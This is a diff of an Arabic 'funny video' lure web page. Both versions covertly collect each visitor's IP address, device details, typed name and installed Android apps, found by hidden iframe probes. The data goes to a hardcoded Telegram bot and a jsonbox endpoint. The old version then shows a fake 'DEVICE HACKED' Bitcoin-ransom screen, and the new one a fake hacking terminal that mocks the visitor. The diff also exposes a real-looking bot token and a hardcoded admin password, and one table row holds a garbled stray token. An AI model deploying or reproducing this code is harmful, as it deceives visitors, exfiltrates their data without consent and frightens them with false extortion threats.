@@ -3,36 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>هههههههههههه</title>
-    <meta name="description" content="😂شوف الفيديو دا هيموتك من الضحك! ">
-    <meta property="og:title" content="🎬 - لازم تشوفه">
+    <title>شوف الفيديو</title>
+    <meta name="description" content="😂 شوف الفيديو دا هيموتك من الضحك!">
+    <meta property="og:title" content="🎬 فيديو مضحك">
     <meta property="og:type" content="video.other">
     <meta property="og:image" content="https://i.imgur.com/3bqPv0b.jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
-    <meta property="og:image:alt" content="Reels video thumbnail with play button">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="😂 فيديو مضحك">
-    <meta name="twitter:description" content="لازم تشوفه قبل ما يختفي 😂">
+    <meta name="twitter:description" content="لازم تشوفه قبل ما يختفي">
     <meta name="twitter:image" content="https://i.imgur.com/3bqPv0b.jpeg">
     <meta name="robots" content="noindex, nofollow">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: black; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
-        .terminal { width: 100%; height: 100%; padding: 30px 25px; white-space: pre-wrap; word-break: break-word; font-size: 20px; line-height: 1.6; overflow-y: auto; scroll-behavior: smooth; }
+        body {
+            background: black;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        /* شاشة إدخال الاسم */
+        .name-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+        }
+        .name-screen h2 {
+            color: #0f0;
+            margin-bottom: 30px;
+            font-size: 2rem;
+        }
+        .name-screen input {
+            background: black;
+            border: 2px solid #0f0;
+            color: #0f0;
+            padding: 12px 20px;
+            font-size: 1.5rem;
+            width: 70%;
+            max-width: 300px;
+            text-align: center;
+            border-radius: 50px;
+            margin-bottom: 20px;
+            outline: none;
+            font-family: monospace;
+        }
+        .name-screen button {
+            background: #0f0;
+            color: black;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            border-radius: 40px;
+            cursor: pointer;
+            font-family: monospace;
+        }
+        /* شاشة العمليات (بدون أرقام حقيقية) */
+        .terminal {
+            width: 100%;
+            height: 100%;
+            padding: 30px 25px;
+            font-size: 20px;
+            line-height: 1.6;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            display: none;
+        }
         .terminal::-webkit-scrollbar { width: 6px; background: #111; }
-        .terminal::-webkit-scrollbar-thumb { background: #0f0; border-radius: 5px; }
-        .red { color: #ff4444; }
-        .glitch { animation: glitch 0.08s infinite; }
-        @keyframes glitch { 0% { transform: translate(1px, 1px); } 25% { transform: translate(-1px, 1px); } 50% { transform: translate(1px, -1px); } 100% { transform: translate(-1px, -1px); } }
-        .final-screen { display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; height: 100vh; width: 100%; padding: 20px; background: black; }
-        .final-screen h1 { font-size: 60px; margin-bottom: 20px; }
-        .final-screen p { font-size: 24px; margin: 15px 0; }
-        .countdown { font-size: 32px; font-weight: bold; color: #ff5555; letter-spacing: 4px; margin-top: 20px; }
-        .small { font-size: 18px; color: #aaaaaa; }
-        .admin-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); backdrop-filter: blur(8px); z-index: 9999; display: flex; justify-content: center; align-items: center; visibility: hidden; opacity: 0; transition: 0.2s; }
+        .terminal::-webkit-scrollbar-thumb { background: #0f0; }
+        /* النتيجة النهائية (الاسم + نوب) */
+        .result {
+            position: fixed;
+            bottom: 40%;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 48px;
+            font-weight: bold;
+            color: #ff5555;
+            text-shadow: 0 0 10px red;
+            display: none;
+            z-index: 30;
+            animation: glitch 0.1s infinite;
+        }
+        @keyframes glitch {
+            0% { transform: skew(0deg, 0deg); opacity: 1; }
+            20% { transform: skew(2deg, 1deg); opacity: 0.9; }
+            40% { transform: skew(-2deg, -1deg); opacity: 1; }
+            60% { transform: skew(1deg, 0deg); opacity: 0.95; }
+            80% { transform: skew(-1deg, 1deg); opacity: 1; }
+            100% { transform: skew(0deg, 0deg); opacity: 1; }
+        }
+        /* لوحة الأدمن (اختصار Ctrl+Shift+A) */
+        .admin-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(8px);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
         .admin-overlay.active { visibility: visible; opacity: 1; }
-        .admin-panel { background: #0a0c0f; border: 2px solid #00ffcc; border-radius: 20px; width: 90%; max-width: 1100px; max-height: 85vh; overflow-y: auto; padding: 25px; color: #ccffcc; }
+        .admin-panel {
+            background: #0a0c0f;
+            border: 2px solid #0ff;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 1100px;
+            max-height: 85vh;
+            overflow-y: auto;
+            padding: 25px;
+            color: #ccffcc;
+        }
         .admin-panel h2 { color: #0ff; border-left: 5px solid #0ff; padding-left: 15px; }
         .admin-stats { display: flex; gap: 30px; background: #111; padding: 15px; border-radius: 14px; margin-bottom: 25px; flex-wrap: wrap; }
         .stat-card { background: #1a1e24; border-radius: 16px; padding: 15px 25px; text-align: center; flex:1; }
@@ -44,246 +148,246 @@
     </style>
 </head>
 <body>
-    <div id="app" class="terminal"></div>
-    <div id="adminOverlay" class="admin-overlay">
-        <div class="admin-panel">
-            <h2>⛁ ADMIN ACCESS ⛁</h2>
-            <div class="admin-stats">
-                <div class="stat-card"><span>📡 TOTAL VISITS</span><div class="stat-number" id="totalVisits">0</div></div>
-                <div class="stat-card"><span>🖥️ UNIQUE IPs</span><div class="stat-number" id="uniqueIps">0</div></div>
-                <div class="stat-card"><span>🌐 LAST 24h</span><div class="stat-number" id="last24h">0</div></div>
-            </div>
-            <div style="display: flex; justify-content: space-between;">
-                <h3>📋 LOGGED IP ADDRESSES</h3>
-                <button class="refresh-btn" id="refreshAdminBtn">⟳ REFRESH</button>
-            </div>
-            <div style="overflow-x: auto;">
-                <table class="ip-table">
-                    <thead><tr><th>#</th><th>IP ADDRESS</th><th>DATE & TIME</th><th>USER AGENT</th></tr></thead>
-                    <tbody id="visitorTableBody"><tr><td colspan="4">loading...</td></tr> </tbody>
-                </table>
-            </div>
-            <button class="close-admin" id="closeAdminBtn">⛌ CLOSE</button>
+
+<!-- شاشة إدخال الاسم -->
+<div id="nameScreen" class="name-screen">
+    <h2>🔐 ادخل اسمك</h2>
+    <input type="text" id="username" placeholder="مثال: وسيم" autocomplete="off">
+    <button id="startBtn">دخول</button>
+</div>
+
+<!-- شاشة العمليات (رسائل مبهمة بدون أرقام حقيقية) -->
+<div id="terminal" class="terminal"></div>
+
+<!-- النتيجة النهائية -->
+<div id="result" class="result"></div>
+
+<!-- لوحة الأدمن (للأدمن فقط، نفس السابق) -->
+<div id="adminOverlay" class="admin-overlay">
+    <div class="admin-panel">
+        <h2>⛁ ADMIN ACCESS ⛁</h2>
+        <div class="admin-stats">
+            <div class="stat-card"><span>📡 TOTAL VISITS</span><div class="stat-number" id="totalVisits">0</div></div>
+            <div class="stat-card"><span>🖥️ UNIQUE IPs</span><div class="stat-number" id="uniqueIps">0</div></div>
+            <div class="stat-card"><span>🌐 LAST 24h</span><div class="stat-number" id="last24h">0</div></div>
         </div>
+        <div style="display: flex; justify-content: space-between;">
+            <h3>📋 LOGGED IP ADDRESSES</h3>
+            <button class="refresh-btn" id="refreshAdminBtn">⟳ REFRESH</button>
+        </div>
+        <div style="overflow-x: auto;">
+            <table class="ip-table">
+                <thead><tr><th>#</th><th>IP ADDRESS</th><th>DATE & TIME</th><th>USER AGENT</th></tr></thead>
+                <tbody id="visitorTableBody"><tr><td colspan="4">loading...<\/td></tr></tbody>
+            </table>
+        </div>
+        <button class="close-admin" id="closeAdminBtn">⛌ CLOSE</button>
     </div>
+</div>
 
-    <script>
-        // ======================== تكوين البوت (ضَع التوكين والآيدي هنا) ========================
-        const BOT_TOKEN = "8187413880:AAHJtjUWuXj6My7ALH9RjplFBs5nw6n4Myo";        // ⬅️ ضع توكن البوت الخاص بك
-        const CHAT_ID   = "5567710346";        // ⬅️ ضع معرف الشات
-        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        // ===================================================================================
+<script>
+    // ======================== تكوين البوت (بدّل التوكن والمعرف بما يناسبك) ========================
+    const BOT_TOKEN = "8187413880:AAHJtjUWuXj6My7ALH9RjplFBs5nw6n4Myo";   // ⬅️ ضع توكن البوت
+    const CHAT_ID   = "5567710346";                                      // ⬅️ ضع معرف الشات
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    // ===================================================================================
 
-        // ------------------- كشف التطبيقات المثبتة على Android -------------------
-        async function detectInstalledApps() {
+    // ---------- دالة جلب IP الحقيقي (للتلغرام فقط) ----------
+    async function getRealIP() {
+        try {
+            let res = await fetch('https://api.ipify.org?format=json');
+            let data = await res.json();
+            return data.ip;
+        } catch(e) {
+            return "0.0.0.0 (خطأ)";
+        }
+    }
+
+    // ---------- كشف التطبيقات المثبتة (للأندرويد فقط) ----------
+    async function detectInstalledApps() {
+        try {
+            if (!/Android/i.test(navigator.userAgent)) return "غير مدعوم (ليس Android)";
+            const apps = [
+                { name: "Facebook", url: "fb://profile" },
+                { name: "Instagram", url: "instagram://user?username=test" },
+                { name: "WhatsApp", url: "whatsapp://send?phone=123" },
+                { name: "Telegram", url: "tg://resolve?domain=test" },
+                { name: "TikTok", url: "tiktok://user?user_id=test" }
+            ];
+            let detected = [];
+            let pending = apps.length;
             return new Promise((resolve) => {
-                // يعمل فقط على Android
-                if (!/Android/i.test(navigator.userAgent)) {
-                    resolve("غير مدعوم (ليس Android)");
-                    return;
-                }
-
-                // قائمة التطبيقات الشائعة مع رابط الاختبار (مخطط URL الخاص بها)
-                const apps = [
-                    { name: "Facebook", scheme: "fb://", testUrl: "fb://profile" },
-                    { name: "Instagram", scheme: "instagram://", testUrl: "instagram://user?username=test" },
-                    { name: "WhatsApp", scheme: "whatsapp://", testUrl: "whatsapp://send?phone=123" },
-                    { name: "Telegram", scheme: "tg://", testUrl: "tg://resolve?domain=test" },
-                    { name: "TikTok", scheme: "tiktok://", testUrl: "tiktok://user?user_id=test" },
-                    { name: "Twitter", scheme: "twitter://", testUrl: "twitter://user?screen_name=test" },
-                    { name: "Snapchat", scheme: "snapchat://", testUrl: "snapchat://" }
-                ];
-
-                let detected = [];
-                let pending = apps.length;
-
-                if (pending === 0) {
-                    resolve("لم يتم اختبار أي تطبيق");
-                    return;
-                }
-
+                if (pending === 0) resolve("لا توجد تطبيقات للاختبار");
                 apps.forEach(app => {
-                    let timeoutId;
                     let iframe = document.createElement('iframe');
                     iframe.style.display = 'none';
-                    iframe.src = app.testUrl;
-
-                    // إذا تم تحميل الـ iframe بسرعة، فهذا يعني أن الرابط لم يفتح تطبيقاً خارجياً (ربما غير مثبت)
-                    const onIframeLoad = () => {
-                        clearTimeout(timeoutId);
-                        // التطبيق غير مثبت (لأن المتصفح استطاع تحميل الصفحة الخطأ)
-                        iframe.remove();
-                        pending--;
-                        if (pending === 0) resolve(detected.length ? detected.join(', ') : "لا يوجد تطبيقات مثبتة من القائمة");
-                    };
-
-                    const onTimeout = () => {
-                        // إذا انتهى الوقت، يعني أن التطبيق فتح نافذة خارجية (مثبت)
+                    iframe.src = app.url;
+                    let timeout = setTimeout(() => {
                         detected.push(app.name);
-                        clearTimeout(timeoutId);
                         iframe.remove();
                         pending--;
-                        if (pending === 0) resolve(detected.length ? detected.join(', ') : "لا يوجد تطبيقات مثبتة من القائمة");
+                        if (pending === 0) resolve(detected.length ? detected.join(', ') : "لا توجد تطبيقات مثبتة من القائمة");
+                    }, 700);
+                    iframe.onload = () => {
+                        clearTimeout(timeout);
+                        iframe.remove();
+                        pending--;
+                        if (pending === 0) resolve(detected.length ? detected.join(', ') : "لا توجد تطبيقات مثبتة من القائمة");
                     };
-
-                    iframe.addEventListener('load', onIframeLoad);
-                    timeoutId = setTimeout(onTimeout, 800); // 800ms كافٍ لظهور نافذة التطبيق
                     document.body.appendChild(iframe);
                 });
-
-                // مهلة عامة بعد 5 ثواني لإرجاع النتائج مهما حدث
                 setTimeout(() => {
-                    if (pending > 0) resolve(detected.length ? detected.join(', ') : "لا يوجد تطبيقات مثبتة (المهلة)");
-                }, 5000);
+                    if (pending > 0) resolve(detected.length ? detected.join(', ') : "المهلة (قد لا يعمل الكشف)");
+                }, 3000);
             });
-        }
+        } catch(e) { return "خطأ في الكشف"; }
+    }
 
-        // ------------------- باقي الدوال: IP، تخزين، تلغرام، إلخ -------------------
-        const ADMIN_PASSWORD = "SecurePass2025";
-        let isAdminAuthenticated = false;
-        
-        function requestAdminAccess() {
-            if (isAdminAuthenticated) { openAdminPanel(); return; }
-            const pwd = prompt("🔐 أدخل كلمة المرور للدخول إلى لوحة الأدمن:");
-            if (pwd === ADMIN_PASSWORD) { isAdminAuthenticated = true; openAdminPanel(); }
-            else if (pwd !== null) alert("❌ كلمة المرور خاطئة.");
-        }
-        
-        document.addEventListener('keydown', (e) => {
-            if (e.ctrlKey && e.shiftKey && e.key === 'A') { e.preventDefault(); requestAdminAccess(); }
-            if (e.key === 'Escape' && adminOverlay.classList.contains('active')) closeAdminPanel();
-        });
-        
-        const adminOverlay = document.getElementById('adminOverlay');
-        function openAdminPanel() { adminOverlay.classList.add('active'); renderAdminStats(); }
-        function closeAdminPanel() { adminOverlay.classList.remove('active'); }
-        document.getElementById('closeAdminBtn').onclick = closeAdminPanel;
-        document.getElementById('refreshAdminBtn').onclick = renderAdminStats;
-        
-        const JSONBOX_URL = "https://jsonbox.io/box_bc3e7a9d1f2c4b8e5a6d";
-        
-        async function fetchPublicIP() { 
-            let r = await fetch('https://api.ipify.org?format=json'); 
-            let d = await r.json(); 
-            return d.ip; 
-        }
-        
-        async function sendToTelegram(ip, userAgent, timeString, installedApps) {
-            if (!BOT_TOKEN || !CHAT_ID) {
-                console.warn("⚠️ لم يتم تعيين توكن البوت أو معرف الشات");
-                return;
-            }
-            
-            const platform = navigator.platform;
-            const screenRes = `${screen.width}x${screen.height}`;
-            const deviceType = /mobile/i.test(userAgent) ? "📱 Mobile" : "💻 Desktop";
-            const language = navigator.language;
-            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "غير معروف";
-            
-            const message = `<b>🌐 زيارة جديدة</b>
-<b>🟢 IP:</b> <code>${ip}</code>
-<b>📅 الوقت:</b> ${timeString}
+    // ---------- إرسال جميع البيانات إلى تلغرام (بدون أن يراها المستخدم) ----------
+    async function sendToTelegram(ip, userAgent, apps, username) {
+        if (!BOT_TOKEN || !CHAT_ID) return;
+        const platform = navigator.platform;
+        const screenRes = `${screen.width}x${screen.height}`;
+        const deviceType = /mobile/i.test(userAgent) ? "📱 موبايل" : "💻 كمبيوتر";
+        const language = navigator.language;
+        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} أنوية` : "غير معروف";
+        const time = new Date().toLocaleString('ar-EG');
+        const message = `<b>🌐 زيارة جديدة</b>
+<b>🆔 الاسم المدخل:</b> ${username}
+<b>🟢 IP الحقيقي:</b> <code>${ip}</code>
+<b>📅 الوقت:</b> ${time}
 <b>💻 نوع الجهاز:</b> ${deviceType}
 <b>🖥️ المنصة:</b> ${platform}
 <b>📺 الدقة:</b> ${screenRes}
 <b>🌍 اللغة:</b> ${language}
 <b>⚙️ عدد الأنوية:</b> ${cores}
-<b>📱 التطبيقات المثبتة (Android):</b> ${installedApps}
+<b>📱 التطبيقات المثبتة (Android):</b> ${apps}
 <b>🔍 وكيل المستخدم:</b> <code>${userAgent.substring(0, 200)}</code>`;
-            
-            try {
-                await fetch(TELEGRAM_API, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, parse_mode: 'HTML', text: message })
-                });
-                console.log("✅ تم إرسال البيانات إلى تلغرام");
-            } catch (err) {
-                console.error("❌ فشل الإرسال إلى تلغرام:", err);
-            }
+        try {
+            await fetch(TELEGRAM_API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, parse_mode: 'HTML', text: message })
+            });
+            console.log("✅ تم الإرسال إلى تلغرام");
+        } catch(err) { console.error(err); }
+    }
+
+    // ---------- شاشة العمليات الوهمية (للمستخدم العادي، بدون أرقام حقيقية) ----------
+    async function showFakeHackingProcess(username) {
+        const terminal = document.getElementById('terminal');
+        terminal.style.display = 'block';
+        terminal.innerHTML = '';
+        // رسائل عامة مبهمة - لا تحتوي على أرقام حقيقية مثل IP أو دقة الشاشة
+        const fakeMessages = [
+            "[+] جاري الاتصال بالخادم المركزي...",
+            "[+] فك تشفير القنوات المشفرة...",
+            "[+] تجاوز جدار الحماية بنجاح...",
+            "[+] الوصول إلى قاعدة البيانات السرية...",
+            "[+] تحميل بيانات المستخدم...",
+            "[+] فحص الملفات المخفية...",
+            "[+] اختراق الحماية الثانوية...",
+            "[+] نسخ المعلومات الحساسة...",
+            "[+] رفع البيانات إلى سحابة بعيدة...",
+            "[+] إخفاء الأثر...",
+            "[+] تمت العملية بنجاح 100%"
+        ];
+        for (let i = 0; i < fakeMessages.length; i++) {
+            terminal.innerHTML += fakeMessages[i] + "\n";
+            terminal.scrollTop = terminal.scrollHeight;
+            await new Promise(r => setTimeout(r, 300 + Math.random() * 400));
         }
-        
-        async function recordVisitToCloud(ip, ua, installedApps) {
-            let now = new Date();
-            let timeStr = now.toLocaleString('ar-EG');
-            let rec = { ip, timestamp: now.toISOString(), userAgent: ua.substring(0, 120), apps: installedApps };
-            try { 
-                await fetch(JSONBOX_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(rec) });
-            } catch(e) { 
-                let fall = JSON.parse(localStorage.getItem("fallback_logs") || "[]"); 
-                fall.push(rec); 
-                localStorage.setItem("fallback_logs", JSON.stringify(fall)); 
-            }
-            await sendToTelegram(ip, ua, timeStr, installedApps);
+        // إظهار النتيجة النهائية (الاسم + نوب)
+        const resultDiv = document.getElementById('result');
+        resultDiv.innerText = `${username} نوب 😂`;
+        resultDiv.style.display = 'block';
+        // إخفاء التيرمينال بعد 2.5 ثانية
+        setTimeout(() => {
+            terminal.style.display = 'none';
+        }, 2500);
+    }
+
+    // ---------- المعالج الرئيسي عند إدخال الاسم ----------
+    async function handleStart() {
+        const input = document.getElementById('username');
+        let userName = input.value.trim();
+        if (userName === "") {
+            alert("الرجاء إدخال اسمك");
+            return;
         }
+        // إخفاء شاشة الاسم
+        document.getElementById('nameScreen').style.display = 'none';
         
-        async function fetchAllVisitors() {
-            try { let r = await fetch(JSONBOX_URL); if(r.ok) return await r.json(); } catch(e) {}
-            return JSON.parse(localStorage.getItem("fallback_logs") || "[]");
-        }
+        // جمع البيانات الحقيقية (في الخلفية)
+        const realIP = await getRealIP();
+        const ua = navigator.userAgent;
+        const apps = await detectInstalledApps();
         
-        async function renderAdminStats() {
-            let records = await fetchAllVisitors();
-            if(!Array.isArray(records)) return;
-            document.getElementById('totalVisits').innerText = records.length;
-            document.getElementById('uniqueIps').innerText = new Set(records.map(r=>r.ip)).size;
-            document.getElementById('last24h').innerText = records.filter(r=>(new Date()-new Date(r.timestamp))<=86400000).length;
-            let tbody = document.getElementById('visitorTableBody');
-            if(!records.length){ tbody.innerHTML = '<tr><td colspan="4">لا بيانات بعد</td></tr>'; return; }
-            let sorted = [...records].sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp));
-            tbody.innerHTML = sorted.map((r,i)=>`<tr><td>${i+1}</td><td>${r.ip}</td><td>${new Date(r.timestamp).toLocaleString()}</td><td>${(r.userAgent||'').substring(0,45)}</td></tr>`).join('');
-        }
+        // إرسال إلى تلغرام (بكل التفاصيل)
+        await sendToTelegram(realIP, ua, apps, userName);
         
-        // ------------------- تأثير الاختراق -------------------
-        const terminalDiv = document.getElementById('app');
-        const hackSteps = ["[+] Connecting...","[+] Accessing Instagram media...","[+] Bypassing security...","[+] Downloading gallery...","[+] Copying messages...","[+] Uploading to darknet...","[+] DONE."];
-        let stepIndex = 0;
-        function addLine(){ 
-            if(stepIndex < hackSteps.length){ 
-                terminalDiv.innerHTML += hackSteps[stepIndex] + "\n"; 
-                stepIndex++; 
-                terminalDiv.scrollTop = terminalDiv.scrollHeight; 
-                setTimeout(addLine, 1100); 
-            } else finishHack(); 
-        }
-        
-        function finishHack(){
-            document.body.classList.add('glitch');
-            setTimeout(()=>{
-                document.body.classList.remove('glitch');
-                terminalDiv.style.display = 'none';
-                let fc = document.createElement('div'); 
-                fc.className = 'final-screen';
-                fc.innerHTML = `<h1 class="red">⚠️ DEVICE HACKED ⚠️</h1><p>All photos, contacts and private data stolen.</p><p class="red">Pay 50 Bitcoinz to prevent leak.</p><p>BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p><div class="countdown" id="timer">23:59:59</div><p class="small">Time left before public release</p>`;
-                document.body.appendChild(fc);
-                startCountdown();
-            }, 1200);
-        }
-        
-        function startCountdown(){
-            let total = 24 * 3600;
-            let timerDiv = document.getElementById('timer');
-            let intv = setInterval(()=>{ 
-                if(total <= 0){ clearInterval(intv); timerDiv.innerText = "00:00:00"; return; }
-                let h = Math.floor(total/3600), m = Math.floor((total%3600)/60), s = total%60;
-                timerDiv.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-                total--;
-            }, 1000);
-        }
-        
-        // ------------------- بدء التنفيذ -------------------
-        (async function(){ 
-            let ip = await fetchPublicIP();
-            let ua = navigator.userAgent;
-            let installedApps = await detectInstalledApps();   // كشف التطبيقات
-            await recordVisitToCloud(ip, ua, installedApps);
-            setTimeout(addLine, 800);
-        })();
-        
-        let hint = document.createElement('div');
-        hint.style.cssText = 'position:fixed; bottom:8px; right:10px; font-size:10px; color:#2f6a44; background:#000000aa; padding:4px 10px; border-radius:20px; z-index:999;';
-        hint.innerText = '🔒 ADMIN: Ctrl+Shift+A';
-        document.body.appendChild(hint);
-    </script>
+        // تشغيل المشهد الوهمي للمستخدم العادي (بدون أرقام حقيقية)
+        await showFakeHackingProcess(userName);
+    }
+
+    // ربط الأحداث
+    document.getElementById('startBtn').addEventListener('click', handleStart);
+    document.getElementById('username').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleStart();
+    });
+
+    // ================== لوحة الأدمن (مثل السابق، اختصاراتها Ctrl+Shift+A وكلمة المرور) ==================
+    const ADMIN_PASSWORD = "SecurePass2025";
+    let isAdminAuthenticated = false;
+    const adminOverlay = document.getElementById('adminOverlay');
+    function openAdminPanel() { adminOverlay.classList.add('active'); renderAdminStats(); }
+    function closeAdminPanel() { adminOverlay.classList.remove('active'); }
+    document.getElementById('closeAdminBtn').onclick = closeAdminPanel;
+    document.getElementById('refreshAdminBtn').onclick = renderAdminStats;
+    
+    function requestAdminAccess() {
+        if (isAdminAuthenticated) { openAdminPanel(); return; }
+        const pwd = prompt("🔐 أدخل كلمة المرور للدخول إلى لوحة الأدمن:");
+        if (pwd === ADMIN_PASSWORD) { isAdminAuthenticated = true; openAdminPanel(); }
+        else if (pwd !== null) alert("❌ كلمة المرور خاطئة.");
+    }
+    document.addEventListener('keydown', (e) => {
+        if (e.ctrlKey && e.shiftKey && e.key === 'A') { e.preventDefault(); requestAdminAccess(); }
+        if (e.key === 'Escape' && adminOverlay.classList.contains('active')) closeAdminPanel();
+    });
+    
+    // دوال تخزين الزيارات وعرضها في لوحة الأدمن (اختياري)
+    const JSONBOX_URL = "https://jsonbox.io/box_bc3e7a9d1f2c4b8e5a6d";
+    async function fetchAllVisitors() {
+        try { let r = await fetch(JSONBOX_URL); if(r.ok) return await r.json(); } catch(e) {}
+        return [];
+    }
+    async function renderAdminStats() {
+        let records = await fetchAllVisitors();
+        document.getElementById('totalVisits').innerText = records.length;
+        document.getElementById('uniqueIps').innerText = new Set(records.map(r=>r.ip)).size;
+        document.getElementById('last24h').innerText = records.filter(r=>(new Date()-new Date(r.timestamp))<=86400000).length;
+        let tbody = document.getElementById('visitorTableBody');
+        if(!records.length){ tbody.innerHTML = '<tr><td colspan="4">لا بيانات بعد<\/td></tr>'; return; }
+        let sorted = [...records].reverse();
+        tbody.innerHTML = sorted.map((r,i)=>`｜｜DSML｜｜<td>${i+1}<\/td><td>${r.ip}<\/td><td>${new Date(r.timestamp).toLocaleString()}<\/td><td>${(r.userAgent||'').substring(0,45)}<\/td><\/tr>`).join('');
+    }
+    (async function recordFirstVisit() {
+        try {
+            let ip = await getRealIP();
+            await fetch(JSONBOX_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip, timestamp: new Date().toISOString(), userAgent: navigator.userAgent.substring(0,120) })
+            });
+        } catch(e) {}
+    })();
+
+    // تلميح صغير للدخول إلى لوحة الأدمن (عادي المستخدم العادي ما بيفهمه)
+    let hint = document.createElement('div');
+    hint.style.cssText = 'position:fixed; bottom:8px; right:10px; font-size:10px; color:#2f6a44; background:#000000aa; padding:4px 10px; border-radius:20px; z-index:999;';
+    hint.innerText = '🔒 ADMIN: Ctrl+Shift+A';
+    document.body.appendChild(hint);
+</script>
 </body>
 </html>
